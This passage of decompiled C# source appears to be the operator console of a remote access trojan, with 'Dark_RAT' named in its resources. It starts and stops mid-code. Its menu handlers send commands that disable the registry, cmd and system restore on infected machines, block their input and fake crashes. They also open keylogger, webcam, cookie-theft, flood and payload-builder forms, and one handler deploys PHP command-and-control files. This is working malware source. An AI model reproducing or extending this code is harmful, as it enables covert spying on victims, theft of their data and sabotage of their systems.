        this.PostData((object) (this.Label1.Text + "|disablecmd|"));
    }

    private void EnableToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|enableregistry|"));
    }

    private void DisableToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|disableregistry|"));
    }

    private void EnableToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|enablesystemrestore|"));
    }

    private void DisableToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|disablesystemrestore|"));
    }

    private void ShutdownToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|shutdown|"));
    }

    private void RestartToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|restart|"));
    }

    private void StandByToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|standby|"));
    }

    private void HibernationToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|hibernation|"));
    }

    private void TurnOnToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|monitoron|"));
    }

    private void TurnOffToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|monitoroff|"));
    }

    private void BlockToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|keymouon|"));
    }

    private void UnblockToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|keymouoff|"));
    }

    private void OpenToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|opencdrom|"));
    }

    private void CloseToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|closecdrom|"));
    }

    private void Mouse00ToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|mouseup|"));
    }

    private void BlockSiteToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        MyProject.Forms.blocksite.Show();
    }

    private void CloseProcessToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        MyProject.Forms.closeproces.Show();
    }

    private void DeleteFileToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        MyProject.Forms.deletefile.Show();
    }

    private void SetIEHomePageToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        MyProject.Forms.iehomepage.Show();
    }

    private void SetClipboardToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        MyProject.Forms.setclipboard.Show();
    }

    private void DwarOnScreenToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        MyProject.Forms.draw.Show();
    }

    private void OpenWebSiteToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        MyProject.Forms.website.Show();
    }

    private void menu_Opening(object sender, CancelEventArgs e)
    {
label_1:
      int num1;
      int num2;
      try
      {
        int num3 = 1;
        string Left = "";
label_2:
        num3 = 2;
        string str1 = "";
label_3:
        num3 = 3;
        string str2 = "";
label_4:
        num3 = 4;
        string str3 = "";
label_5:
        num3 = 5;
        string str4 = "";
label_6:
        num3 = 6;
        string str5 = "";
label_7:
        num3 = 7;
        IEnumerator enumerator = this.ListView1.SelectedItems.GetEnumerator();
        goto label_17;
label_9:
        ProjectData.ClearProjectError();
        num1 = -2;
label_10:
        num3 = 9;
        ListViewItem current;
        Left = current.SubItems[0].Text;
label_11:
        num3 = 10;
        str1 = current.SubItems[1].Text;
label_12:
        num3 = 11;
        str2 = current.SubItems[2].Text;
label_13:
        num3 = 12;
        str3 = current.SubItems[3].Text;
label_14:
        num3 = 13;
        str4 = current.SubItems[4].Text;
label_15:
        num3 = 14;
        str5 = current.SubItems[5].Text;
label_16:
        num3 = 15;
label_17:
        if (enumerator.MoveNext())
        {
          current = (ListViewItem) enumerator.Current;
          goto label_9;
        }
        else if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
label_21:
        num3 = 16;
        if (Operators.CompareString(Left, "", false) != 0)
          goto label_23;
label_22:
        num3 = 17;
        Left = "ALL";
label_23:
label_24:
        num3 = 19;
        this.Label1.Text = Left;
label_25:
        num3 = 20;
        this.Label2.Text = str1;
label_26:
        num3 = 21;
        this.Label3.Text = str2;
label_27:
        num3 = 22;
        this.Label4.Text = str3;
label_28:
        num3 = 23;
        this.Label5.Text = str4;
label_29:
        num3 = 24;
        this.Label6.Text = str5;
label_30:
        num3 = 25;
        if (this.ListView1.Columns[0].Width == 0)
          goto label_32;
label_31:
        num3 = 27;
label_32:
label_33:
        num3 = 29;
        if (this.ListView1.Columns[1].Width == 0)
          goto label_35;
label_34:
        num3 = 31;
label_35:
label_36:
        num3 = 33;
        if (this.ListView1.Columns[2].Width == 0)
          goto label_38;
label_37:
        num3 = 35;
label_38:
label_39:
        num3 = 37;
        if (this.ListView1.Columns[3].Width == 0)
          goto label_41;
label_40:
        num3 = 39;
label_41:
label_42:
        num3 = 41;
        if (this.ListView1.Columns[4].Width == 0)
          goto label_44;
label_43:
        num3 = 43;
label_44:
label_45:
        num3 = 45;
        if (this.ListView1.Columns[5].Width == 0)
          goto label_47;
label_46:
label_47:
        goto label_54;
label_49:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_5;
              case 6:
                goto label_6;
              case 7:
                goto label_7;
              case 8:
                goto label_9;
              case 9:
                goto label_10;
              case 10:
                goto label_11;
              case 11:
                goto label_12;
              case 12:
                goto label_13;
              case 13:
                goto label_14;
              case 14:
                goto label_15;
              case 15:
                goto label_16;
              case 16:
                goto label_21;
              case 17:
                goto label_22;
              case 18:
                goto label_23;
              case 19:
                goto label_24;
              case 20:
                goto label_25;
              case 21:
                goto label_26;
              case 22:
                goto label_27;
              case 23:
                goto label_28;
              case 24:
                goto label_29;
              case 25:
                goto label_30;
              case 26:
              case 28:
                goto label_32;
              case 27:
                goto label_31;
              case 29:
                goto label_33;
              case 30:
              case 32:
                goto label_35;
              case 31:
                goto label_34;
              case 33:
                goto label_36;
              case 34:
              case 36:
                goto label_38;
              case 35:
                goto label_37;
              case 37:
                goto label_39;
              case 38:
              case 40:
                goto label_41;
              case 39:
                goto label_40;
              case 41:
                goto label_42;
              case 42:
              case 44:
                goto label_44;
              case 43:
                goto label_43;
              case 45:
                goto label_45;
              case 46:
              case 48:
                goto label_47;
              case 47:
                goto label_46;
              case 49:
                goto label_54;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_49;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_54:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void LockToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|lockdesktop|"));
    }

    private void UnlockToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|desktopunlock|"));
    }

    private void ShowToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|showclock|"));
    }

    private void HideToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|hideclock|"));
    }

    private void ShowToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|shownotify|"));
    }

    private void HideToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|hidenotify|"));
    }

    private void CleanRecycleBinToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|emptyrecbin|"));
    }

    private void CloseToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|closeprogramthis|"));
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private void ExitToolStripMenuItem_Click(object sender, EventArgs e) => ProjectData.EndApp();

    private void FocusToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|focusdesktop|"));
    }

    private void MuteToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|mutesound|"));
    }

    private void ShowToolStripMenuItem2_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|showtaskbar|"));
    }

    private void HideToolStripMenuItem2_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|hidetaskbar|"));
    }

    private void ShowToolStripMenuItem3_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|showicons|"));
    }

    private void HideToolStripMenuItem3_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|hideicons|"));
    }

    private void BlockToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|blockusbwrite|"));
    }

    private void UnblockToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|unblockusbwrite|"));
    }

    private void ProcessSusResToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        MyProject.Forms.editprocess.Show();
    }

    private void SettingsToolStripMenuItem_Click(object sender, EventArgs e) => MyProject.Forms.settings.Show();

    private void ChangeProcessTitleToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        MyProject.Forms.startbutton.Show();
    }

    private void SetTimeToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        MyProject.Forms.time.Show();
    }

    private void InfoToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        MyProject.Forms.info.Show();
    }

    private void ShowToolStripMenuItem4_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|bsodon|"));
    }

    private void HideToolStripMenuItem4_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|bsodoff|"));
    }

    private void PrintToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        MyProject.Forms.print.Show();
    }

    private void LeftToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|swapmouse1|"));
    }

    private void RightToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|swapmouse2|"));
    }

    private void OnToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|funnycapslockon|"));
    }

    private void TurnOffToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|funnycapslockoff|"));
    }

    private void FakeMessageToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        MyProject.Forms.fakemessage.Show();
    }

    private void LockToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|lockclipboard|"));
    }

    private void EnabledToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|enableshowhiden|"));
    }

    private void DisabledToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|disableshowhiden|"));
    }

    private void InlockToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|clipboardoff|"));
    }

    private void ToolStripStatusLabel2_Click(object sender, EventArgs e)
    {
    }

    private void PHPFilesToolStripMenuItem_Click(object sender, EventArgs e)
    {
      FolderBrowserDialog folderBrowserDialog = new FolderBrowserDialog();
      int num1 = (int) folderBrowserDialog.ShowDialog();
      if (Operators.CompareString(folderBrowserDialog.SelectedPath, "", false) == 0)
        return;
      byte[] data = Dark_RAT.My.Resources.Resources.data;
      FileStream fileStream1 = System.IO.File.Create(folderBrowserDialog.SelectedPath + "/data.php");
      fileStream1.Write(data, 0, data.Length);
      fileStream1.Close();
      byte[] index = Dark_RAT.My.Resources.Resources.index;
      FileStream fileStream2 = System.IO.File.Create(folderBrowserDialog.SelectedPath + "/index.php");
      fileStream2.Write(index, 0, index.Length);
      fileStream2.Close();
      byte[] ip = Dark_RAT.My.Resources.Resources.ip;
      FileStream fileStream3 = System.IO.File.Create(folderBrowserDialog.SelectedPath + "/ip.php");
      fileStream3.Write(ip, 0, ip.Length);
      fileStream3.Close();
      byte[] users = Dark_RAT.My.Resources.Resources.users;
      FileStream fileStream4 = System.IO.File.Create(folderBrowserDialog.SelectedPath + "/users.php");
      fileStream4.Write(users, 0, users.Length);
      fileStream4.Close();
      new StreamWriter(folderBrowserDialog.SelectedPath + "/log.txt").Close();
      new StreamWriter(folderBrowserDialog.SelectedPath + "/data.txt").Close();
      new StreamWriter(folderBrowserDialog.SelectedPath + "/online.txt").Close();
      int num2 = (int) Interaction.MsgBox((object) "Sucesseful!");
    }

    private void HideToolStripMenuItem5_Click(object sender, EventArgs e) => this.Hide();

    private void icon_MouseDoubleClick(object sender, MouseEventArgs e)
    {
      if (MyProject.Forms.LoginForm.loggedin)
        this.Show();
      else
        MyProject.Forms.LoginForm.Show();
    }

    private void BuilderToolStripMenuItem_Click(object sender, EventArgs e) => MyProject.Forms.builder.Show();

    private void DesktopToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        MyProject.Forms.desktop.Show();
    }

    private void ProcessManagerToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        MyProject.Forms.proces.Show();
    }

    private void Button1_Click_1(object sender, EventArgs e)
    {
      this.TextBox1.ReadOnly = true;
      this.connected = (object) "1";
      this.fvgrSc7fMzt32at3 = this.TextBox1.Text;
      this.ToolStripStatusLabel1.Text = "Status : Connected";
      this.OnlineUsers();
      this.checkusers.Start();
    }

    private void Button2_Click_1(object sender, EventArgs e)
    {
      this.checkusers.Stop();
      this.TextBox1.ReadOnly = false;
      this.ToolStripStatusLabel1.Text = "Status : Not Connected";
      this.connected = (object) "0";
    }

    private void KeyloggerToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        MyProject.Forms.keylogger.Show();
    }

    private void TurnOnToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|flip2screen|"));
    }

    private void TurnOffToolStripMenuItem2_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|flipnoscreen|"));
    }

    private void GetFlagToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        MyProject.Forms.flag.Show();
    }

    private void FloodToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        MyProject.Forms.flood.Show();
    }

    private void CountryToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.ListView1.Columns[0].Width == 0)
        this.ListView1.Columns[0].Width = 100;
      else
        this.ListView1.Columns[0].Width = 0;
    }

    private void OSToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.ListView1.Columns[1].Width == 0)
        this.ListView1.Columns[1].Width = 100;
      else
        this.ListView1.Columns[1].Width = 0;
    }

    private void IPToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.ListView1.Columns[2].Width == 0)
        this.ListView1.Columns[2].Width = 100;
      else
        this.ListView1.Columns[2].Width = 0;
    }

    private void CountryToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      if (this.ListView1.Columns[3].Width == 0)
        this.ListView1.Columns[3].Width = 100;
      else
        this.ListView1.Columns[3].Width = 0;
    }

    private void CPUToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.ListView1.Columns[4].Width == 0)
        this.ListView1.Columns[4].Width = 100;
      else
        this.ListView1.Columns[4].Width = 0;
    }

    private void RAMToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.ListView1.Columns[5].Width == 0)
        this.ListView1.Columns[5].Width = 100;
      else
        this.ListView1.Columns[5].Width = 0;
    }

    private void AboutToolStripMenuItem_Click(object sender, EventArgs e) => MyProject.Forms.o.Show();

    private void ChatToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        MyProject.Forms.chat.Show();
    }

    private void WebcamToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        MyProject.Forms.webcam.Show();
    }

    private void TurnOnToolStripMenuItem2_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|startsaver|"));
    }

    private void TurnOffToolStripMenuItem3_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|stopsaver|"));
    }

    private void ToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        MyProject.Forms.corupt.Show();
    }

    private void InstalledSoftwareToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        MyProject.Forms.soft.Show();
    }

    private void ClickerToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        MyProject.Forms.clickad.Show();
    }

    private void ToolStripMenuItem2_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        MyProject.Forms.background.Show();
    }

    private void CookiesToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
